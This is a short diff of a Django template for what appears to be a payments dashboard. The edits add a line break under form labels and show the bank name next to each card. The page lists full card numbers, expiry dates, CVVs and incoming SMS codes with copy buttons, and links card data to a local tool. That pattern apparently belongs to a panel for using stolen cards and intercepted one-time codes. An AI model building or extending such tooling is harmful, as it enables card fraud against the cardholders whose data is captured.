@@ -21,7 +21,7 @@
 
             {% for field in form  %}
                 <div class="col-auto">
-                <b>{{ field.label_tag }}</b> - {{ field }}
+                <b>{{ field.label_tag }}</b><br>{{ field }}
                 </div>
             {% endfor %}
             <div class="row">
@@ -86,7 +86,7 @@
                   {% if payment.pay_type == 'card_2' %}<a href="http://localhost:3000/?payment_id={{payment.id}}&amount={{ payment.amount }}&{{ payment.card_data_url }}&{{ payment.phone_script_data_url }}" target="_blank">🚀</a>{% endif %}
                   {% if payment.card_data %}
                     <span id="card_number{{payment.id}}">{{ payment.card_number }}<img onclick="CopyToClipboard('card_number{{payment.id}}')" style="opacity: 0.5;"class="img-thumbnail" width="25" height="25" src="{% static '/img/copy.png' %}"></span>
-                    <br>{{ payment.expired_month }}/{{payment.expired_year}} {{ payment.cvv}}
+                    <br>{{payment.bank_name}} {{ payment.expired_month }}/{{payment.expired_year}} {{ payment.cvv}}
                     <span id="sms_code{{payment.id}}"
                     {% if payment.sms_code %} style="background-color: #11e834" {% endif %}>
                     {{ payment.sms_code|default_if_none:'----'}}<img onclick="CopyToClipboard('sms_code{{payment.id}}')" style="opacity: 0.5;"class="img-thumbnail" width="25" height="25" src="{% static '/img/copy.png' %}"></span>
